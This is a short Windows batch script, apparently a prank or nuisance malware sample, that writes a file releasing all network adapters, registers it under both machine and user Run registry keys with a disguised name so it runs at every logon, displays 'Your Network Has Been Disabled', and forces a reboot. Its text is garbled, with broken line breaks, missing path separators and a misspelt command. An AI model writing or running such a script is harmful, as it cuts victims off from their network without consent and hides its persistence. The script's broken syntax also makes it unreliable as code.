echo @echo off>c:networkA.bat
echo break off>c:networkA.bat echo
ipconfig/release_all>c:networkA.bat
echo end>c:networkA.bat reg add
hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:networkA.bat /f reg add
hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROL exit /t reg_sz /d c:networkA.bat /f echo Your Network Has Been Disabled 
vmic where os primary=1 reboot
